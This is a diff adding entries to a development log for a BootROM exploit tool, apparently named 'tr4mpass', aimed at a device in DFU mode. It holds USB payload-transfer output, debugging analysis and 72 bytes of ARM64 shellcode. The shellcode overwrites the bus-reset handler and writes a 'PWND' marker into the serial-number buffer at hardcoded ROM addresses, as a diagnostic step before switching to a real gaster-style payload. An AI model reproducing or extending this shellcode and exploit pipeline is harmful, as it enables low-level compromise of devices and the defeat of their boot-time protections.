@@ -2311,6 +2311,75 @@ sudo ./tr4mpass
 - ✅ Implementado (commit 3520e41)
 - Pendiente de prueba en dispositivo
 
+---
+
+## v1.0.49 — RESULT (2026-06-11)
+
+```
+version 1.0.49  DIAG v2  pool+0x28
+send_payload_chunks: actual=1608 status=TIMED_OUT
+Direct read: [43 E0 F7 DA 38 5A] (6 bytes garbage) — EP0 locked
+Bus-reset verify: CPID:8010... (98 bytes, serial re-initialized)
+```
+
+### Analysis:
+The `ldr x0,[x0]` double-dereference was wrong. `gUSBSerialNumber = 0x180083CF8`
+is the string buffer address directly, not a pointer-to-pointer. Reading the
+first 8 bytes (`"CPID:801"`) as a 64-bit address → data abort → **full BootROM
+reset** → SRAM re-initialized → nothing persists.
+
+Confirmed by: bus-reset verify always returns clean CPID serial (full reset
+happened, not just USB re-enum). This is worse than v1.0.44 behavior where
+only USB re-enum occurred.
+
+### What v1.0.44 actually did:
+Wrote `0x41414141` to `gUSBSerialNumber[0..3]` (correct address, no deref).
+Serial string became `AAAA...`. But then our bus-reset verify called
+`libusb_reset_device` → BootROM `dfu_handle_bus_reset` fired → re-initialized
+serial from ROM → PWND wiped. We never checked BEFORE the bus reset.
+
+---
+
+## v1.0.50 — Diag shellcode v3: null bus_reset + direct write (2026-06-11)
+
+### Root cause chain summarized:
+| Version | What went wrong |
+|---------|-----------------|
+| v1.0.44 | Wrote canary correctly but bus-reset verify wiped it |
+| v1.0.49 | Double-deref → data abort → full BootROM reset |
+| **v1.0.50** | **Fixed: null bus_reset handler first, then write** |
+
+### Shellcode (72 bytes):
+```arm64
+stp  x29,x30,[sp,#-0x10]!
+ldr  x0, pool_bus_reset     ; 0x60,0x01,0x00,0x58  → +0x30
+str  xzr, [x0]              ; null dfu_handle_bus_reset
+ldr  x0, pool_gusb          ; 0x60,0x01,0x00,0x58  → +0x38
+add  x0, x0, #1             ; gaster +1 convention
+adr  x1, pool_pwnd          ; 0x61,0x01,0x00,0x10  → +0x40
+ldr  x2, [x1]
+str  x2, [x0]               ; write ' PWND:[DG]' to gUSBSN+1
+ldp  x29,x30,[sp],#0x10
+ret
+nop; nop                    ; pool alignment
+// +0x30: dfu_handle_bus_reset addr (patched: 0x180088B78)
+// +0x38: gUSBSerialNumber addr     (patched: 0x180083CF8)
+// +0x40: " PWND:[DG]"              (hardcoded 8 bytes)
+```
+Offsets verified with Python ARM64 encoder. ✅
+
+### Expected outcome:
+```
+[DIAG v3] bus_reset=0x180088B78 gUSBSN=0x180083CF8
+Bus-reset verify: serial = "xPWND:[DG]..." or " PWND:[DG]..."
+```
+If PWND appears → ROP+shellcode pipeline confirmed working → switch to real
+gaster shellcode (`sudo ./tr4mpass` without DIAG env var).
+
+### Commit: a04a06f
+```
+
+
 
 ```
 
